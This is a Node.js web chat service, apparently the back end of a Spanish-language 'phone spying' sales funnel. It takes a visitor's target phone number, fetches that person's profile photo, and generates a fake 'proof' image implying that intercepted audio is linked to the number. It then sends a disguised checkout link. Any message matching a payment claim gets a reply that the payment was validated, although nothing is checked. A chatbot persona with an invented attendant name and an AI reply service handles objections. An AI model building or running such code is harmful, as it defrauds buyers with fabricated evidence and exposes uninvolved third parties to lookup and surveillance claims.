const fs = require('fs');
const path = require('path');
const db = require('../storage/db');
const { extractNewTargetPhone, lookupProfilePicture, buildSpanishCheckoutUrl } = require('./flowEngine');
const { composeProofImage } = require('./imageComposer');
const aiService = require('./aiService');
const { eventBus } = require('./flowEngine');

const SESSIONS_FILE = path.join(__dirname, '../../data/webchat_sessions.json');

function loadSessions() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      return JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
    }
  } catch (e) {}
  return {};
}

function saveSessions(sessions) {
  try {
    fs.mkdirSync(path.dirname(SESSIONS_FILE), { recursive: true });
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2), 'utf8');
  } catch (e) {
    console.error('[WebChatService] Erro ao salvar sessões:', e.message);
  }
}

/**
 * Retorna as configurações ativas da atendente e do webchat
 */
function getWebChatConfig() {
  const settings = db.getSettings() || {};
  const webchat = settings.webchat || {};
  return {
    attendantName: webchat.attendantName || 'Maria Carvalho',
    attendantAvatar: webchat.attendantAvatar || 'https://pps.whatsapp.net/v/t61.24694-24/813733428_1659309575529240_7059521085506520943_n.jpg?ccb=11-4&oh=01_Q5Aa5gF-J4FlH_Qp6Hw86K6kJbV6zf-_6llpJ4Uj1LmFt9T_IA&oe=6AB8CB65&_nc_sid=5e03e0&_nc_cat=111',
    welcomeMessage: webchat.welcomeMessage || '¡Hola! 👋 Mucho gusto. ¿Cómo te llamas y qué número te gustaría investigar hoy?',
    offerAmount: webchat.offerAmount || '19',
    campaignMode: webchat.campaignMode || 'webchat' // 'webchat' ou 'whatsapp'
  };
}

/**
 * Inicializa ou recupera a sessão do webchat
 */
async function initSession(sessionId, utmData = {}) {
  const sessions = loadSessions();
  let session = sessions[sessionId];

  const config = getWebChatConfig();

  if (!session) {
    session = {
      id: sessionId,
      slug: utmData.slug || 'campanha',
      state: 'INITIAL',
      targetPhone: null,
      photoUrl: null,
      messages: [],
      utm: utmData,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    sessions[sessionId] = session;
    saveSessions(sessions);
  }

  return {
    success: true,
    sessionId: session.id,
    attendant: {
      name: config.attendantName,
      avatar: config.attendantAvatar
    },
    welcomeMessage: config.welcomeMessage,
    history: session.messages || []
  };
}

/**
 * Processa uma mensagem enviada pelo lead no WebChat
 */
async function handleIncomingMessage(sessionId, messageText, utmData = {}) {
  const sessions = loadSessions();
  let session = sessions[sessionId];

  if (!session) {
    session = {
      id: sessionId,
      slug: utmData.slug || 'campanha',
      state: 'INITIAL',
      targetPhone: null,
      photoUrl: null,
      messages: [],
      utm: utmData,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
  }

  const rawMsg = String(messageText || '').trim();
  const config = getWebChatConfig();
  const funnel = db.getFunnel() || {};

  // Salva mensagem do usuário
  session.messages.push({
    from: 'user',
    text: rawMsg,
    timestamp: new Date().toISOString()
  });
  session.updatedAt = new Date().toISOString();

  const replies = [];

  // 1. RECONHECIMENTO DE COMPROVANTE OU PAGAMENTO ("ya pagué", etc.)
  const isPaymentClaim = /(?:yas*pag[uú][eé]|listos*pag|pagos*realizado|yas*compr[eé]|acabos*des*pagar|pagu[eé]s*cons*tarjeta|pagos*hecho|j[aá]s*paguei|paguei)/i.test(rawMsg);
  if (isPaymentClaim && (session.state === 'OFERTA_ENVIADA' || session.state === 'NEGOCIACAO' || session.state === 'FINALIZADO')) {
    const accessCode = utmData.codigo || session.utm?.codigo || 'vip';
    const accessUrl = `https://spysfunills.vercel.app/upsell1/?code=${accessCode}`;
    const deliveryMsg = `¡Pago recibido y validado con éxito! 🎉\n\nTu acceso completo e ilimitado al panel ha sido desbloqueado.\n\nAccede ahora mismo a través de este enlace seguro:\n👉 ${accessUrl}\n\n¡Ingresa y aprovecha todas las herramientas!`;

    session.state = 'FINALIZADO';
    session.messages.push({ from: 'bot', text: deliveryMsg, timestamp: new Date().toISOString() });
    sessions[sessionId] = session;
    saveSessions(sessions);

    replies.push({ type: 'text', text: deliveryMsg, delay: 1000 });
    return { success: true, replies };
  }

  // 2. DETECÇÃO DE NÚMERO ALVO (executa fluxo de prova e oferta)
  const detectedTargetDigits = extractNewTargetPhone(rawMsg);

  if (detectedTargetDigits) {
    let normalizedTarget = detectedTargetDigits;
    const commonDdis = ['52', '507', '591', '56', '57', '51', '593', '34', '54', '504', '502', '503', '506', '595', '598', '505', '592', '297', '55', '1'];
    const startsWithDdi = commonDdis.some(code => normalizedTarget.startsWith(code));
    if (!startsWithDdi && (normalizedTarget.length === 10 || normalizedTarget.length === 11)) {
      normalizedTarget = '55' + normalizedTarget;
    }

    session.targetPhone = normalizedTarget;
    session.state = 'ANALISANDO';

    // A) Mensagem imediata de análise
    const analyzingMsg = 'Espera un momento mientras verificamos en el sistema...';
    replies.push({ type: 'text', text: analyzingMsg, delay: 800 });

    // B) Busca foto do alvo via multi-estratégia blindada
    console.log(`[WebChat] 🔍 Buscando foto para número alvo: ${normalizedTarget} (Session: ${sessionId})`);
    let photoUrl = null;
    try {
      photoUrl = await lookupProfilePicture(normalizedTarget, null);
    } catch (e) {
      console.warn('[WebChat] Erro na busca de foto:', e.message);
    }
    session.photoUrl = photoUrl;

    // C) Compõe a imagem de prova em alta resolução
    console.log(`[WebChat] 🖼️ Gerando imagem de prova (hasPhoto: ${Boolean(photoUrl)})`);
    const imgBuffer = await composeProofImage(photoUrl, funnel.avatarCoordinates, 'es');
    const proofsDir = path.join(__dirname, '../../public/generated');
    fs.mkdirSync(proofsDir, { recursive: true });
    const filename = `proof_web_${normalizedTarget}_${Date.now()}.png`;
    fs.writeFileSync(path.join(proofsDir, filename), imgBuffer);
    const webProofUrl = `/generated/${filename}`;

    const proofCaption = photoUrl
      ? '✓ Prueba con foto en el audio vinculada a este número'
      : '🔒 Prueba con audio protegido por encriptación vinculada a este número';

    replies.push({
      type: 'image',
      url: webProofUrl,
      caption: proofCaption,
      delay: 2800
    });

    // D) Constrói URL de checkout camuflada
    const rawCheckout = funnel.checkoutUrlEs || funnel.checkouts?.es?.frontUrl || 'https://go.centerpag.com/PPU38CQG5EL';
    const cloakedCheckout = buildSpanishCheckoutUrl(rawCheckout, utmData.codigo || session.utm?.codigo || 'web');

    const offerAmount = config.offerAmount || '19';
    const offerText = `Enlace para el pago de $${offerAmount} 👇\n\nDatos del pago: 🔒 Pago 100% seguro, confidencial y encriptado.`;

    replies.push({
      type: 'checkout',
      text: offerText,
      checkoutUrl: cloakedCheckout,
      amount: offerAmount,
      delay: 1800
    });

    // E) Instrução de envio de comprovante
    const proofInstruction = '¡En cuanto pagues, envíame el comprobante por aquí para desbloquear tu acceso de inmediato!';
    replies.push({
      type: 'text',
      text: proofInstruction,
      delay: 1500
    });

    session.state = 'OFERTA_ENVIADA';

    // Salva mensagens no histórico
    session.messages.push({ from: 'bot', text: analyzingMsg, timestamp: new Date().toISOString() });
    session.messages.push({ from: 'bot', text: proofCaption, mediaType: 'image', mediaUrl: webProofUrl, timestamp: new Date().toISOString() });
    session.messages.push({ from: 'bot', text: offerText, checkoutUrl: cloakedCheckout, amount: offerAmount, timestamp: new Date().toISOString() });
    session.messages.push({ from: 'bot', text: proofInstruction, timestamp: new Date().toISOString() });

    sessions[sessionId] = session;
    saveSessions(sessions);

    // Emite alerta para a Dashboard
    try {
      eventBus.emit('new_lead', {
        phone: normalizedTarget,
        codigo: utmData.codigo || 'web',
        campaign: utmData.utm_campaign || 'WebChat Simulator',
        text: `Alvo investigado: +${normalizedTarget}`,
        timestamp: new Date().toISOString()
      });
    } catch(e) {}

    return { success: true, replies };
  }

  // 3. SE NÃO FOR NÚMERO: DÚVIDAS, OBJEÇÕES OU PERGUNTAS RESPONDIDAS POR IA
  console.log(`[WebChat] 🤖 Consultando GPT em espanhol para dúvida: "${rawMsg}" (Estado: ${session.state})`);
  const stageInfo = {
    value: config.offerAmount || '19',
    checkoutUrl: buildSpanishCheckoutUrl(funnel.checkoutUrlEs || 'https://go.centerpag.com/PPU38CQG5EL', utmData.codigo || 'web')
  };

  const aiReply = await aiService.classifyAndReply(
    rawMsg,
    session.messages,
    stageInfo,
    'es',
    session.state,
    session.targetPhone
  );

  session.messages.push({ from: 'bot', text: aiReply, timestamp: new Date().toISOString() });
  sessions[sessionId] = session;
  saveSessions(sessions);

  replies.push({ type: 'text', text: aiReply, delay: 1200 });
  return { success: true, replies };
}

/**
 * Retorna as sessões registradas no WebChat para a Dashboard
 */
function getAllSessions(limit = 50) {
  const sessions = loadSessions();
  const list = Object.values(sessions).sort((a, b) => new Date(b.updatedAt || 0) - new Date(a.updatedAt || 0));
  return list.slice(0, limit);
}

/**
 * Atualiza configurações do WebChat
 */
function updateConfig(newConfig = {}) {
  const settings = db.getSettings() || {};
  settings.webchat = {
    ...(settings.webchat || {}),
    ...newConfig
  };
  db.saveSettings(settings);
  return getWebChatConfig();
}

module.exports = {
  getWebChatConfig,
  initSession,
  handleIncomingMessage,
  getAllSessions,
  updateConfig
};
